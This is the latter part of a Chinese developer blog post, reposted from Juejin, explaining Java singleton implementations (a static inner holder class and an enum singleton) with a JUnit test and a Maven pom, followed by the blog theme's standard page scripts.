<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;public class SingletonInnerclass {</span><br><span class="line">    private static class SingletonHolder{</span><br><span class="line">        public static SingletonInnerclass instance = new SingletonInnerclass();</span><br><span class="line">    }</span><br><span class="line">    private SingletonInnerclass(){}</span><br><span class="line">    public static SingletonInnerclass getInstance(){</span><br><span class="line">        return SingletonHolder.instance;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>&#x8FD9;&#x79CD;&#x5199;&#x6CD5;&#x4ECD;&#x7136;&#x4F7F;&#x7528;<code>JVM</code>&#x672C;&#x8EAB;&#x673A;&#x5236;&#x4FDD;&#x8BC1;&#x4E86;&#x7EBF;&#x7A0B;&#x5B89;&#x5168;&#x95EE;&#x9898;&#xFF1B;&#x7531;&#x4E8E; <code>SingletonHolder</code> &#x662F;&#x79C1;&#x6709;&#x7684;&#xFF0C;&#x9664;&#x4E86; <code>getInstance()</code> &#x4E4B;&#x5916;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x8BBF;&#x95EE;&#x5B83;&#xFF0C;&#x56E0;&#x6B64;&#x5B83;&#x662F;&#x61D2;&#x6C49;&#x5F0F;&#x7684;&#xFF1B;&#x540C;&#x65F6;&#x8BFB;&#x53D6;&#x5B9E;&#x4F8B;&#x7684;&#x65F6;&#x5019;&#x4E0D;&#x4F1A;&#x8FDB;&#x884C;&#x540C;&#x6B65;&#xFF0C;&#x6CA1;&#x6709;&#x6027;&#x80FD;&#x7F3A;&#x9677;&#xFF1B;&#x4E5F;&#x4E0D;&#x4F9D;&#x8D56; <code>JDK</code> &#x7248;&#x672C;&#x3002;</p>
<h2 id="6-&#x679A;&#x4E3E;&#x578B;"><a href="#6-&#x679A;&#x4E3E;&#x578B;" class="headerlink" title="6.&#x679A;&#x4E3E;&#x578B;"></a>6.&#x679A;&#x4E3E;&#x578B;</h2><p>&#x901A;&#x8FC7;enum&#x5173;&#x952E;&#x5B57;&#x6765;&#x5B9E;&#x73B0;&#x679A;&#x4E3E;&#xFF0C;&#x5728;&#x679A;&#x4E3E;&#x4E2D;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x6709;&#xFF1A;</p>
<p>1.&#x679A;&#x4E3E;&#x4E2D;&#x7684;&#x5C5E;&#x6027;&#x5FC5;&#x987B;&#x653E;&#x5728;&#x6700;&#x524D;&#x9762;&#xFF0C;&#x4E00;&#x822C;&#x4F7F;&#x7528;&#x5927;&#x5199;&#x5B57;&#x6BCD;&#x8868;&#x793A;</p>
<p>2.&#x679A;&#x4E3E;&#x4E2D;&#x53EF;&#x4EE5;&#x548C;java&#x7C7B;&#x4E00;&#x6837;&#x5B9A;&#x4E49;&#x65B9;&#x6CD5;</p>
<p>3.&#x679A;&#x4E3E;&#x4E2D;&#x7684;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x5FC5;&#x987B;&#x662F;&#x79C1;&#x6709;&#x7684;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;public class Resource{</span><br><span class="line">    //&#x8FD9;&#x91CC;&#x5C31;&#x662F;&#x9700;&#x8981;&#x5B58;&#x653E;&#x7684;&#x5355;&#x4F8B;&#x8D44;&#x6E90;</span><br><span class="line">    public Resource(){</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">public enum Singleton{</span><br><span class="line">    INSTANCE;</span><br><span class="line">    private Resource instance = null;</span><br><span class="line">    Singleton(){</span><br><span class="line">        instance = new Resource();</span><br><span class="line">    }</span><br><span class="line">    public Resource getInstance() {</span><br><span class="line">        return instance;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>&#x9ED8;&#x8BA4;&#x679A;&#x4E3E;&#x5B9E;&#x4F8B;&#x7684;&#x521B;&#x5EFA;&#x662F;&#x7EBF;&#x7A0B;&#x5B89;&#x5168;&#x7684;.(&#x521B;&#x5EFA;&#x679A;&#x4E3E;&#x7C7B;&#x7684;&#x5355;&#x4F8B;&#x5728;JVM&#x5C42;&#x9762;&#x4E5F;&#x662F;&#x80FD;&#x4FDD;&#x8BC1;&#x7EBF;&#x7A0B;&#x5B89;&#x5168;&#x7684;),&#x8FD9;&#x4E2A;&#x4F18;&#x79C0;&#x7684;&#x601D;&#x60F3;&#x76F4;&#x63A5;&#x6E90;&#x4E8E;Joshua Bloch&#x7684;&#x300A;Effective Java&#x300B;&#xFF08;&#x300A;Java&#x9AD8;&#x6548;&#x7F16;&#x7A0B;&#x6307;&#x5357;&#x300B;&#xFF09;&#x3002; &#x6240;&#x4EE5;&#x4E0D;&#x9700;&#x8981;&#x62C5;&#x5FC3;&#x7EBF;&#x7A0B;&#x5B89;&#x5168;&#x7684;&#x95EE;&#x9898;</p>
<p>&#x8FD9;&#x91CC;&#x6709;&#x51E0;&#x4E2A;&#x539F;&#x56E0;&#x5173;&#x4E8E;&#x4E3A;&#x4EC0;&#x4E48;&#x5728;Java&#x4E2D;&#x5B81;&#x613F;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x679A;&#x4E3E;&#x91CF;&#x6765;&#x5B9E;&#x73B0;&#x5355;&#x4F8B;&#x6A21;&#x5F0F;&#xFF1A;</p>
<p>1&#x3001; &#x81EA;&#x7531;&#x5E8F;&#x5217;&#x5316;&#xFF1B;</p>
<p>2&#x3001; &#x4FDD;&#x8BC1;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x5B9E;&#x4F8B;&#xFF08;&#x5373;&#x4F7F;&#x4F7F;&#x7528;&#x53CD;&#x5C04;&#x673A;&#x5236;&#x4E5F;&#x65E0;&#x6CD5;&#x591A;&#x6B21;&#x5B9E;&#x4F8B;&#x5316;&#x4E00;&#x4E2A;&#x679A;&#x4E3E;&#x91CF;&#xFF09;&#xFF1B;</p>
<p>3&#x3001; &#x7EBF;&#x7A0B;&#x5B89;&#x5168;</p>
<h2 id="Junit&#x6D4B;&#x8BD5;"><a href="#Junit&#x6D4B;&#x8BD5;" class="headerlink" title="Junit&#x6D4B;&#x8BD5;"></a>Junit&#x6D4B;&#x8BD5;</h2><p>&#x4E0B;&#x9762;&#x662F;&#x6784;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;maven&#x9879;&#x76EE;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x7684;&#x7A0B;&#x5E8F;&#x8FDB;&#x884C;&#x5206;&#x6790;&#x5B66;&#x4E60;&#x3002;&#x4E4B;&#x540E;&#x5C06;&#x4F1A;&#x628A;&#x7A0B;&#x5E8F;&#x6E90;&#x7801;&#x653E;&#x5230;&#x6211;&#x7684;<a href="/external_links/0f7fb04c18428176ddc28d65aba361c1.html" target="blank" rel="noopener">github</a>&#x4E0A;&#x3002;</p>
<ul>
<li><strong>Java&#x4EE3;&#x7801;&#x6D4B;&#x8BD5;&#x5982;&#x4E0B;</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;import  org.junit.Test;</span><br><span class="line">public class AppTest</span><br><span class="line">{</span><br><span class="line">    @Test</span><br><span class="line">    public void test(){</span><br><span class="line">        Singleton singleton1 = Singleton.getInstance();</span><br><span class="line">        Singleton singleton2 = Singleton.getInstance();</span><br><span class="line">        System.out.println(&quot;Singleton Test&quot;+singleton1.hashCode()+&quot;and&quot;+singleton2.hashCode());</span><br><span class="line">        SingletonInnerclass singleton3 = SingletonInnerclass.getInstance();</span><br><span class="line">        SingletonInnerclass singleton4 = SingletonInnerclass.getInstance();</span><br><span class="line">        System.out.print(&quot;SingletonInnerclass Test&quot;+singleton3.hashCode()+&quot;and&quot;+singleton4.hashCode());</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>maven&#x914D;&#x7F6E;&#x5982;&#x4E0B;</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line">  &lt;groupId&gt;com.nezha.dp&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;dp&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">  &lt;packaging&gt;jar&lt;/packaging&gt;</span><br><span class="line">  &lt;name&gt;dp&lt;/name&gt;</span><br><span class="line">  &lt;url&gt;http://maven.apache.org&lt;/url&gt;</span><br><span class="line">  &lt;properties&gt;</span><br><span class="line">    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">  &lt;/properties&gt;</span><br><span class="line">  &lt;dependencies&gt;</span><br><span class="line">    &lt;!-- https://mvnrepository.com/artifact/junit/junit --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;4.11&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">  &lt;/dependencies&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<h2 id="&#x53C2;&#x8003;&#x6587;&#x732E;"><a href="#&#x53C2;&#x8003;&#x6587;&#x732E;" class="headerlink" title="&#x53C2;&#x8003;&#x6587;&#x732E;"></a>&#x53C2;&#x8003;&#x6587;&#x732E;</h2><p>[1] <a href="/external_links/543cc49184bc2f11bef8d461ab9ae2a9.html" target="blank" rel="noopener">blog.csdn.net/goodlixueyo&#x2026;</a></p>
<p>[2] Freeman E, Freeman E, Sierra K, et al. Head First &#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;[J]. 2007.</p>
<p>[3] <a href="/external_links/6e3dbb77efa948c4d9c9388a8b4871ff.html" target="blank" rel="noopener">wuchong.me/blog/2014/0&#x2026;</a></p>
<p><strong>&#x672C;&#x6587;&#x8F6C;&#x8F7D;&#x81EA;:</strong> <a href="/external_links/ae036a512cec64eba9bcd43e0f942fc7.html" target="blank" rel="noopener">&#x6398;&#x91D1;</a></p>
<p><em><a href="https://dev.newban.cn/">&#x5F00;&#x53D1;&#x8005;&#x535A;&#x5BA2; &#x2013; &#x548C;&#x5F00;&#x53D1;&#x76F8;&#x5173;&#x7684; &#x8FD9;&#x91CC;&#x5168;&#x90FD;&#x6709;</a></em></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="../358/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="../../">1</a><span class="space">&hellip;</span><a class="page-number" href="../358/">358</a><span class="page-number current">359</span><a class="page-number" href="../360/">360</a><span class="space">&hellip;</span><a class="page-number" href="../399/">399</a><a class="extend next" rel="next" href="../360/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">开发者博客</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="https://dev.newban.cn/archives/">
              
                  <span class="site-state-item-count">3990</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">1304</span>
                  <span class="site-state-item-name">标签</span>
                
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="../../atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">开发者博客</span>
  <div>
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
  </div>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




  <script type="text/javascript" async src="js/src/mermaid.min.js"></script>
  <script>
  if (window.mermaid) {
        var mermaid_config = {
            startOnLoad: true,
            theme: 'default',
            flowchart:{
                useMaxWidth: false,
                htmlLabels: true
            }                
        }
        mermaid.initialize(mermaid_config);
  }
  </script>
  

        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="../../lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="../../lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="../../lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="../../lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="../../lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="../../lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="../../js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="../../js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="../../js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
